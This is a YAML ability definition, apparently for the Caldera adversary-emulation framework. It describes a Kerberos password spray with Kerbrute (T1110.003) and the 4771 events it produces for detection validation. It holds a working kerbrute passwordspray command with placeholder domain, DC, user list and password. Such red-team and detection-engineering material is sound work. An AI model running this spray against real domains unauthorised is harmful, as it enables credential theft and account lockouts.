---
- id: c1a1e001-0001-4a1a-9a11-000000000001
  name: Password Spray via Kerbrute
  description: |
    Performs a password spray against a list of domain user accounts using
    Kerbrute's Kerberos pre-authentication timing technique, which validates
    credentials without generating a full logon event. Produces repeated
    4771 (Kerberos pre-authentication failed) events with Failure Code 0x18
    (bad password) against multiple accounts from a single source IP.
  tactic: credential-access
  technique:
    attack_id: T1110.003
    name: "Brute Force: Password Spraying"
  platforms:
    linux:
      sh:
        command: |
          kerbrute passwordspray -d #{domain.name} --dc #{dc.ip} #{userlist.path} #{spray.password}
  requirements: []
  privilege: null
  repeatable: true
  singleton: false

  # Note: no `parsers:` block. Caldera v5's parser schema requires
  # purpose-built per-tool parser modules (source/edge/target fields);
  # no built-in parser exists for raw Kerbrute output. Results are
  # captured as raw command output and validated manually against Kibana
  # (see /validation).
